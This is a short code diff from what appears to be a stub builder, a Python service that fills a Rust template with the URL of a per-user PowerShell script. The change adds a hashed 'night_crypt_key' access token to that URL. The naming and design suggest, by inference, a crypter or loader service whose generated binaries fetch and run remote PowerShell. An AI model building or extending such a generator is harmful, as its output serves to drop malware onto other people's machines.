@@ -329,7 +329,8 @@ def create_stub():
                         with open(rust_template_path, 'r', encoding='utf-8') as f:
                             rust_template = f.read()
 
-                        ps_script_url = f"http://127.0.0.1:{PORT}/stubs/{user_id}/ps/{ps1_filename}"
+                        auth_key = hashlib.sha256(f"{user_id}_night_crypt_key".encode()).hexdigest()
+                        ps_script_url = f"http://127.0.0.1:{PORT}/stubs/{user_id}/ps/{ps1_filename}?key={auth_key}"
 
                         rust_code = rust_template.replace('{{POWERSHELL_URL}}', ps_script_url)
 
